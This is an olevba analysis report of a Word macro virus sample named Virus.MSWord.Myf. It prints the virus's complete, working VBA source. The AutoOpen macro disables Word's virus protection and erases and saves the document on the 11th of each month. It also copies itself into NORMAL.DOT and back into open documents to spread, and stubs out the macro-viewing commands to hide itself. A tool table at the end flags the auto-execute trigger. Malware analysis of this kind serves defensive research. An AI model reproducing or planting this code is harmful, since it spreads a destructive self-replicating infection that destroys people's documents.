olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Myf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Myf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Myf - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error Resume Next
Dim MyFile$
Dim normal
Dim OkExist
Dim i
Dim TemplateName$
Dim active

Options.VirusProtection = False

If Day(Date) = 11 Then
   Selection.WholeStory
   Selection.Delete
   Application.Quit savechanges:=wdSaveChanges
End If

MyFile$ = WordBasic.[FileName$]()
TemplateName$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"

normal = WordBasic.CountMacros(0)
OkExist = 0
For i = 1 To normal
    If WordBasic.[MacroName$](i, 0) = "AutoOpen" Then OkExist = 1
Next i

If OkExist <> 1 Then
    Application.OrganizerCopy Source:=MyFile$, Destination:=TemplateName$, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
    WordBasic.FileSave
End If

active = WordBasic.CountMacros(1)
OkExist = 0
For i = 1 To active
    If WordBasic.[MacroName$](i, 1) = "AutoOpen" Then OkExist = 1
Next i

If OkExist <> 1 Then
    Application.OrganizerCopy Source:=TemplateName$, Destination:=MyFile$, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
    WordBasic.FileSave
End If

End Sub
Sub ToolsMacro()
'Dialogs(wdDialogToolsMacro).Show
End Sub
Sub viewVBcode()
 ShowVisualBasicEditor = False
End Sub
Sub FileTemplates()
'dialogs(wdfiletemplates).show
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

